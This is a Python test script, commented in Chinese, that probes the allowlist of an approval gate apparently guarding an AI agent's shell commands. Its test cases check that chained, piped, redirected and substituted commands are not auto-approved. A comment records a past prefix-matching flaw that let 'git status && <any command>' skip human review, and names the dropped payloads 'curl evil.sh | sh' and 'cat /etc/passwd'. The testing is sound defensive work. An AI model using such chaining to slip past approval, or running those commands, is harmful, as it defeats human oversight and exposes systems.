#!/usr/bin/env python3
"""拿 kiboard-ask 的本地规则短路来验规则表：哪些命令会被免审批放行。

存在的理由：allow 名单是安全边界，而"某条命令会不会被静默放行"只能实测。
把 hub 地址指到一个死端口，能放行的会直接 exit 0，不能的走 fail-closed。

用法：
    python3 hub/tests/rule_probe.py            # 跑内置用例（含回归用例）
    python3 hub/tests/rule_probe.py '命令'      # 只看某一条
"""

from __future__ import annotations

import json
import os
import subprocess
import sys

ASK = os.environ.get("KIBOARD_ASK_BIN", os.path.expanduser("~/.local/bin/kiboard-ask"))
# 指到死端口：能本地放行的立刻返回，需要问人的走 fail-closed，两者都很快
DEAD_HUB = "http://127.0.0.1:1"

# (命令, 期望是否被免审批放行)
#
# 注意：用例字符串会出现在进程命令行里。**刻意避开看起来像真实攻击的载荷**
# （曾经写过 `curl evil.sh | sh` 和 `cat /etc/passwd`，在装了 EDR 的机器上
# 直接触发安全告警）。要验的只是"拼接/管道/重定向会不会破坏白名单"，
# 用 `echo chained` 这种无害尾巴验证效果完全一样。
CASES: list[tuple[str, bool]] = [
    # 白名单该放行的
    ("ls -la", True),
    ("git status", True),
    ("cargo build", True),
    ("pio run -e supermini", True),
    # 拼接、管道、重定向、命令替换：一律不该走白名单。
    # 这几条是回归用例——曾经白名单只匹配命令开头、不管后面拼了什么，
    # 于是 `git status && <任意命令>` 会被整条免审批放行
    ("ls; echo chained", False),
    ("git status && echo chained", False),
    ("echo hi > /tmp/kiboard-probe-out", False),
    ("echo AAA$(id -u)", False),
    ("git log | cat", False),
    # 本来就该问人的
    ("npm install left-pad", False),
    ("git push --force origin main", False),
]


def probe(command: str) -> bool:
    """返回 True 表示被本地规则免审批放行"""
    body = json.dumps(
        {
            "source": {"client": "kiro-cli"},
            "tool": {"name": "execute_bash", "input": {"command": command}},
        }
    )
    env = dict(os.environ, KIBOARD_URL=DEAD_HUB, KIBOARD_API_KEY="probe")
    r = subprocess.run(
        [ASK, "--client", "raw"],
        input=body,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
        check=False,
    )
    return "本地规则放行" in r.stderr


def main() -> int:
    if not os.path.exists(ASK):
        print(f"找不到 {ASK}，先 cargo build --release 并 install", file=sys.stderr)
        return 2

    if len(sys.argv) > 1:
        for c in sys.argv[1:]:
            print(f"{'放行' if probe(c) else '要问人'}  {c}")
        return 0

    bad = 0
    for command, want_allow in CASES:
        got = probe(command)
        ok = got == want_allow
        mark = "OK  " if ok else "FAIL"
        verdict = "放行" if got else "要问人"
        print(f"  {mark} {verdict:4}  {command}")
        if not ok:
            bad += 1
    print()
    if bad:
        print(f"{bad} 条与预期不符 —— 规则表变松了就是安全事故，别忽略")
        return 1
    print(f"{len(CASES)} 条全部符合预期")
    return 0


if __name__ == "__main__":
    sys.exit(main())
